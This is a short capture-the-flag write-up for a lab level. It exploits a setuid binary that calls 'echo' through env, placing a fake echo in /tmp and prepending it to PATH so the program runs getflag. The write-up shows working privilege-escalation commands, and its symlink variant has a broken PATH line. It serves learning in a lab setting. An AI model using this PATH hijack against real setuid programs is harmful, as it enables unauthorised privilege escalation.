solution level03:

> ls -la
-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03

-> the owner of the program is the user flag03. the file permissions indicate that the setuid bit is set, so the program could run commands such as getflag

-> we check the strings contained in the executable
> objdump -S -j .rodata level03
"..../usr/bin/env"
" echo Exploit me"

-> we can change the PATH environment variable to use a fake echo which will execute the getflag command
> echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH;

(we can also create a symbolic link)
> ln -s /bin/getflag /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp;$PATH;

-> we execute the program
> ./level03
